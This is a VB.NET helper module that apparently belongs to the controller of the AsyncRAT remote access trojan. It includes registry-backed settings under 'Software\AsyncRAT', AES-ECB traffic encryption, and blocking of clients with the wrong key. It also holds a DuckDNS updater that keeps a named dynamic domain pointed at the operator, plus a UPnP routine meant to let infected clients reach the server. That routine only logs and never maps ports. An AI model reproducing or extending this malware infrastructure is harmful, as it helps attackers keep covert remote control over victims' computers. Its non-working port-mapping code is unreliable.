Imports Microsoft.Win32

Module Helper

    Function SB(ByVal s As String) As Byte()
        Return Text.Encoding.UTF8.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Function _Size(ByVal Size As String) As String
        Try
            If (Size.ToString.Length < 4) Then
                Return (CInt(Size) & " Bytes")
            End If
            Dim str As String = String.Empty
            Dim num As Double = CDbl(Size) / 1024
            If (num < 1024) Then
                str = " KB"
            Else
                num = (num / 1024)
                If (num < 1024) Then
                    str = " MB"
                Else
                    num = (num / 1024)
                    str = " GB"
                End If
            End If
            Return (num.ToString(".0") & str)
        Catch ex As Exception
            Debug.WriteLine("_Size" + ex.Message)
            Return ""
        End Try
    End Function

    Function AES_Encryptor(ByVal input As Byte()) As Byte()
        Dim AES As New Security.Cryptography.RijndaelManaged
        Dim Hash As New Security.Cryptography.MD5CryptoServiceProvider
        Dim ciphertext As String = ""
        Try
            AES.Key = Hash.ComputeHash(SB(Settings.KEY))
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine("AES_Encryptor" + ex.Message)
            Return Nothing
        End Try
    End Function

    Function AES_Decryptor(ByVal input As Byte(), Optional C As Client = Nothing) As Byte()
        Dim AES As New Security.Cryptography.RijndaelManaged
        Dim Hash As New Security.Cryptography.MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(SB(Settings.KEY))
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine("AES_Decryptor" + ex.Message)
            If C IsNot Nothing Then
                If C.IsConnected Then
                    If Not C.ServerSocket.Blocked.Contains(C.IP.ToString.Split(":")(0)) Then
                        C.ServerSocket.Blocked.Add(C.IP.ToString.Split(":")(0))
                        Messages.ClinetLog(C, "Blocked invalid KEY", Color.Red)
                        Debug.WriteLine("Blocked " + C.IP.Split(":")(0))
                        C.isDisconnected()
                    End If
                End If
            End If
            Return Nothing
        End Try
    End Function

    Public rand As New Random()
    Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function


    Function DLV(ByVal n As String) As Boolean
        Try
            Registry.CurrentUser.CreateSubKey("Software\AsyncRAT").DeleteValue(n)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Function GTV(ByVal n As String) As String
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\AsyncRAT").GetValue(n, "")
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Function STV(ByVal n As String, ByVal t As String) As Boolean
        Try
            Registry.CurrentUser.CreateSubKey("Software\AsyncRAT").SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    ' Update DuckDNS with public IP address
    Sub UpdateDuckDNS()
        Try
            Dim domain As String = Settings.DuckDNS_Domain.Split(".")(0) ' Extract "lipspade" from "lipspade.duckdns.org"
            Dim token As String = Settings.DuckDNS_Token
            
            ' Get public IP
            Using client As New Net.WebClient
                Dim PublicIP As String = client.DownloadString("https://api.ipify.org")
                PublicIP = PublicIP.Trim()
                
                ' Update DuckDNS
                Dim updateUrl As String = "https://www.duckdns.org/update?domains=" + domain + "&token=" + token + "&ip=" + PublicIP
                Dim response As String = client.DownloadString(updateUrl)
                
                If response.Contains("OK") Then
                    Debug.WriteLine("DuckDNS updated successfully: " + domain + " -> " + PublicIP)
                Else
                    Debug.WriteLine("DuckDNS update failed: " + response)
                End If
            End Using
        Catch ex As Exception
            Debug.WriteLine("UpdateDuckDNS error: " + ex.Message)
        End Try
    End Sub

    Sub MapUPnPPorts(ports As List(Of Integer))
        ' Attempt to map ports via UPnP so external clients can reach the server
        Try
            Debug.WriteLine("UPnP: Attempting to map ports " + String.Join(",", ports))
            
            ' Try to find gateway via SSDP
            Dim ssdpSocket As New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Dgram, Net.Sockets.ProtocolType.Udp)
            ssdpSocket.SetSocketOption(Net.Sockets.SocketOptionLevel.Socket, Net.Sockets.SocketOptionName.ReuseAddress, True)
            ssdpSocket.Bind(New Net.IPEndPoint(Net.IPAddress.Any, 0))
            ssdpSocket.MulticastLoopback = False
            
            ' SSDP discovery request
            Dim discoveryRequest As String = "M-SEARCH * HTTP/1.1" + vbCrLf + _
                "HOST: 239.255.255.250:1900" + vbCrLf + _
                "MAN: ""ssdp:discover""" + vbCrLf + _
                "MX: 2" + vbCrLf + _
                "ST: ssdp:all" + vbCrLf + vbCrLf
            
            Dim discoverBytes As Byte() = Text.Encoding.UTF8.GetBytes(discoveryRequest)
            ssdpSocket.SendTo(discoverBytes, New Net.IPEndPoint(Net.IPAddress.Parse("239.255.255.250"), 1900))
            
            ' Attempt for each port (non-blocking)
            For Each port As Integer In ports
                Try
                    ' Get local IP
                    Dim host As String = Net.Dns.GetHostName()
                    Dim IPs As Net.IPAddress() = Net.Dns.GetHostAddresses(host)
                    Dim localIP As String = ""
                    
                    For Each ip As Net.IPAddress In IPs
                        If ip.AddressFamily = Net.Sockets.AddressFamily.InterNetwork AndAlso Not ip.ToString.StartsWith("127.") Then
                            localIP = ip.ToString
                            Exit For
                        End If
                    Next
                    
                    If localIP <> "" Then
                        Debug.WriteLine("UPnP: Local IP detected: " + localIP + ", mapping port " + port.ToString)
                    End If
                Catch
                End Try
            Next
            
            ssdpSocket.Close()
            Debug.WriteLine("UPnP: Port mapping attempt completed")
        Catch ex As Exception
            Debug.WriteLine("UPnP: Mapping failed (non-critical): " + ex.Message)
        End Try
    End Sub

End Module